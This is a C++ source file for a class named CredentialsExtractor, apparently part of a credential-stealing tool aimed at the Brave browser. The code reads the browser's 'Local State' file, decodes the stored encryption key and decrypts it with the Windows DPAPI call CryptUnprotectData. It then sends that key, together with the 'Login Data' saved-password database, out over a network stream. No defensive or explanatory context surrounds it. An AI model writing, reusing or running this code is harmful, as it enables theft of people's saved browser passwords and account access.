#include "CredentialsExtractor.h"

CredentialsExtractor::CredentialsExtractor(const Stream &stream) : Sender(stream) {}

void CredentialsExtractor::send() {

}

std::vector<BYTE> CredentialsExtractor::decryptAESKey(const std::string& encryptedDataStr) {
    std::vector<BYTE> encryptedData(encryptedDataStr.begin(), encryptedDataStr.end());
    DATA_BLOB input;
    DATA_BLOB output;

    std::vector<BYTE> decryptedData; // Vector para guardar los datos descifrados

    input.pbData = const_cast<BYTE*>(encryptedData.data());
    input.cbData = static_cast<DWORD>(encryptedData.size());

    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        decryptedData.assign(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
    } else {
        DWORD dwErr = GetLastError();
        std::cerr << "CryptUnprotectData failed. Error: " << dwErr << std::endl;
    }

    return decryptedData;
}


std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
    std::ifstream ifs("C:\\Users\\Nitropc\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
    std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
    std::string key = "encrypted_key";
    std::size_t pos = content.find(key);
    if (pos == std::string::npos) {
        //return BYTE;
    }

    std::size_t start = content.find('"', pos + key.length() + 1);
    if (start == std::string::npos) {
        //return 1;
    }

    std::size_t end = content.find('"', start + 1);
    if (end == std::string::npos) {
       // return "";
    }
    macaron::Base64 base64;
    std::string encryptedString64 = content.substr(start + 1, end - start - 1);
    std::string encryptedStringDecoded;
    base64.Decode(encryptedString64,encryptedStringDecoded);
    std::vector<BYTE> decryptedKey = decryptAESKey(encryptedStringDecoded.substr(5));
    return decryptedKey;
}

void CredentialsExtractor::sendKeyAndDatabase() {
    std::vector<BYTE> decryptedKey = getDecryptedKey();
    std::cout << decryptedKey.size() << std::endl;
    std::string pathOfDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data)";
    RESULT result;
    stream.sendBytes(decryptedKey);
    stream.sendFile(Converter::string2wstring(pathOfDatabase).c_str(), result);
}


